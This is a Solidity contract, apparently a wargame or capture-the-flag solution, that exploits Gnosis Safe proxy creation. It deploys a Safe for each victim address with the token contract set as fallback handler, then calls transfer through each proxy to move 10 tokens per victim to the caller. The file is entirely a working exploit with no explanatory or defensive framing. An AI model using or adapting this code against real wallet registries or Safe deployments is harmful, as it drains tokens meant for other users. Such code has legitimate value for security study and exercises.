// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@gnosis.pm/safe-contracts/contracts/GnosisSafe.sol";
import "@gnosis.pm/safe-contracts/contracts/proxies/GnosisSafeProxyFactory.sol";
import "@gnosis.pm/safe-contracts/contracts/proxies/IProxyCreationCallback.sol";

contract BackdoorAttacker {
    function exploit(
        address[] memory users,
        address factory,
        address mastercopy,
        IERC20 token,
        IProxyCreationCallback callbackAddress
    ) external {
        GnosisSafeProxyFactory _factory = GnosisSafeProxyFactory(factory);
        for(uint256 i=0;i<users.length;++i){
            address[] memory _owners = new address[](1);
            _owners[0] = users[i];
            GnosisSafeProxy gsproxy = _factory.createProxyWithCallback(
                mastercopy,
                abi.encodeWithSelector(
                    GnosisSafe.setup.selector,
                    _owners,           //_owners
                    1,                //_threshold
                    address(0),       //to
                    "0x0",            //data
                    token,          //fallbackHandler; The contract that will be delegatecall to; It's a backdoor
                    address(0),       //paymentToken
                    0,                //payment
                    address(0)        //paymentReceiver
                ),
                1337, ///nonce
                callbackAddress
            );
            IERC20(address(gsproxy)).transfer(msg.sender, 10 ether); // call transfer function on the proxy; get into backdoor
        }
    }
}